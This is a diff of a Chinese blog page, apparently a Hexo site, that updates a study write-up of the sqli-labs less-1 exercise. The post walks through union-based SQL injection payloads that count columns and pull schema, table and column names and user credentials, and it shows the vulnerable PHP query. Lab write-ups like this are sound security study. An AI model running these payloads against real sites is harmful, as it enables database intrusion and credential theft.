@@ -19,15 +19,15 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"D:\\study\\blog\\node_modules\\hexo-generator-searchdb\\templates\\search.xml"};
   </script>
 
-  <meta name="description" content="sqlilab学习less-11、先输入?id&#x3D;1 and 1&#x3D;2判断发现回显正常，显然不是数字型注入。 2、在?id后面加上&#39; ,回显报错，存在字符型注入。 3、在后面加上注释符#或--+后，页面回显正常，可以得出存在单引号字符型注入。 4、使用以下payload： 1?id&#x3D;1&amp;#x27; order by 3--+   &#x2F;&#x2F;1,2,3回显均正常，4回显不正常。  说明此表有3列。 5">
+  <meta name="description" content="sqlilab学习sqlilabs练习，主要参考郁离歌大佬的博客和SQL注入天书。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入之sqlilab">
 <meta property="og:url" content="http://example.com/2021/05/14/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqlilab/index.html">
 <meta property="og:site_name" content="枫霜月雨のblog">
-<meta property="og:description" content="sqlilab学习less-11、先输入?id&#x3D;1 and 1&#x3D;2判断发现回显正常，显然不是数字型注入。 2、在?id后面加上&#39; ,回显报错，存在字符型注入。 3、在后面加上注释符#或--+后，页面回显正常，可以得出存在单引号字符型注入。 4、使用以下payload： 1?id&#x3D;1&amp;#x27; order by 3--+   &#x2F;&#x2F;1,2,3回显均正常，4回显不正常。  说明此表有3列。 5">
+<meta property="og:description" content="sqlilab学习sqlilabs练习，主要参考郁离歌大佬的博客和SQL注入天书。">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-05-14T12:00:41.000Z">
-<meta property="article:modified_time" content="2021-05-20T04:01:09.258Z">
+<meta property="article:modified_time" content="2021-05-22T02:56:35.999Z">
 <meta property="article:author" content="枫霜月雨">
 <meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
@@ -76,7 +76,119 @@
   </style>
 </noscript>
 
-</head>
+<style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
 
 <body itemscope itemtype="http://schema.org/WebPage">
   <div class="container use-motion">
@@ -121,7 +233,7 @@
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
         <li class="menu-item menu-item-tags">
@@ -224,7 +336,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-20 12:01:09" itemprop="dateModified" datetime="2021-05-20T12:01:09+08:00">2021-05-20</time>
+                <time title="修改时间：2021-05-22 10:56:35" itemprop="dateModified" datetime="2021-05-22T10:56:35+08:00">2021-05-22</time>
               </span>
 
           <br>
@@ -233,7 +345,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.4k</span>
+              <span>1.5k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -252,16 +364,16 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="sqlilab学习"><a href="#sqlilab学习" class="headerlink" title="sqlilab学习"></a>sqlilab学习</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p>1、先输入<code>?id=1 and 1=2</code>判断发现回显正常，显然不是数字型注入。</p>
-<p>2、在<code>?id</code>后面加上<code>&#39;</code> ,回显报错，存在字符型注入。</p>
+        <h1 id="sqlilab学习"><a href="#sqlilab学习" class="headerlink" title="sqlilab学习"></a>sqlilab学习</h1><p>sqlilabs练习，主要参考郁离歌大佬的博客和SQL注入天书。</p>
+<span id="more"></span>
+<h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p>1、先输入<code>?id=1 and 1=2</code>判断发现回显正常，显然不是数字型注入。</p>
+<p>2、在<code>?id</code>后面加上<code>'</code> ,回显报错，存在字符型注入。</p>
 <p>3、在后面加上注释符<code>#</code>或<code>--+</code>后，页面回显正常，可以得出存在单引号字符型注入。</p>
 <p>4、使用以下payload：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3--+   //1,2,3回显均正常，4回显不正常。</span></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">' order by 3--+   //1,2,3回显均正常，4回显不正常。</span></span><br></pre></td></tr></table></figure>
 <p>说明此表有3列。</p>
 <p>5、使用payload：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
 <p>联合查询语句查看页面是否有回显，发现页面回显2、3，说明页面有2个显示位。</p>
 <p>看一下源码，mysql_fetch_array只被调用了一次，</p>
 <p>而mysql_fetch_array从结果集中取得一行作为关联数组</p>
@@ -270,23 +382,21 @@
 <p>只要让第一行查询的结果是空集0或-1，即union左边的select子句查询结果为空，</p>
 <p>那么union右边的查询结果自然就成为了第一行，打印在网页上了。</p>
 <p>6、使用payload爆库名：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+</span></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+</span></span><br></pre></td></tr></table></figure>
 <p>7、使用payload爆库security的表</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='</span>security<span class="string">'--+</span></span><br></pre></td></tr></table></figure>
 <p>ps：table_schema=后面可以直接加单引号括起的数据库名，也可以是数据库的16进制，过滤单引号可用。</p>
 <p>首先说一下mysql的数据库information_schema，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，<br>用户权限等信息，下面说一下常用的几个表</p>
 <p>SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。</p>
 <p>TABLES表:储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表</p>
 <p>COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等。是show columns from schemaname.tablename的结果取之此表。</p>
 <p>8、爆列</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='</span>users<span class="string">'--+</span></span><br></pre></td></tr></table></figure>
 <p>9、爆数据</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,username,password from users where id=2--+   //查看第二栏的数据</span></span><br></pre></td></tr></table></figure>
-
-
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,username,password from users where id=2--+   //查看第二栏的数据</span></span><br></pre></td></tr></table></figure>
+<h3 id="SQL语句："><a href="#SQL语句：" class="headerlink" title="SQL语句："></a>SQL语句：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><script type="math/tex; mode=display">
+\_</script>
     </div>
 
     
@@ -369,7 +479,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlilab%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">sqlilab学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#less-1"><span class="nav-number">1.1.</span> <span class="nav-text">less-1</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlilab%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">sqlilab学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#less-1"><span class="nav-number">1.1.</span> <span class="nav-text">less-1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E8%AF%AD%E5%8F%A5%EF%BC%9A"><span class="nav-number">1.1.1.</span> <span class="nav-text">SQL语句：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-2"><span class="nav-number">1.2.</span> <span class="nav-text">less-2</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -392,7 +502,7 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -501,6 +611,59 @@
   
 
   
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '[object Object]';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
@@ -578,7 +741,37 @@
 
 
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hibiki.model.json"},"display":{"position":"left","width":250,"height":600},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hibiki.model.json"},"display":{"position":"left","width":250,"height":600},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+</body>
 </html>
 <!-- 页面点击小红心 -->
 <script type="text/javascript" src="/js/click-love.js"></script>
